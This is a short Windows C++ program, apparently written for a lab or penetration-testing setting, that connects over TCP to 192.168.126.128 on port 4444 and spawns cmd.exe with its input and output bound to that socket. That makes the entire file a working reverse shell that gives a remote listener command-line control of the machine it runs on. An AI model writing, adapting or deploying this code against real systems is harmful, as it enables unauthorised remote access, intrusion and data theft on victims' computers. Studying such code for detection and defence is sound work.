#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")
#define HOSTNAME "192.168.126.128"
#define PORT "4444"

int main()
{
    WSADATA wsaData;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed\n");
        return 1;
    }

    struct addrinfo* result = NULL, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(HOSTNAME, PORT, &hints, &result) != 0) {
        printf("getaddrinfo failed\n");
        WSACleanup();
        return 1;
    }

    SOCKET ConnectSocket = WSASocketW(result->ai_family, result->ai_socktype, result->ai_protocol, NULL, NULL, NULL);
    if (ConnectSocket == INVALID_SOCKET) {
        printf("socket failed\n");
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }


    if (WSAConnect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        printf("connect failed\n");
        closesocket(ConnectSocket);
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;

    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)ConnectSocket;

    wchar_t app[] = L"C:\\WINDOWS\\system32\\cmd.exe";
    if (!CreateProcess(app,NULL,NULL,NULL,TRUE,0,NULL,NULL,&si, &pi))
    {
        printf("CreateProcess failed (%d)\n", GetLastError());
        closesocket(ConnectSocket);
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    closesocket(ConnectSocket);
    freeaddrinfo(result);
    WSACleanup();

    return 0;
}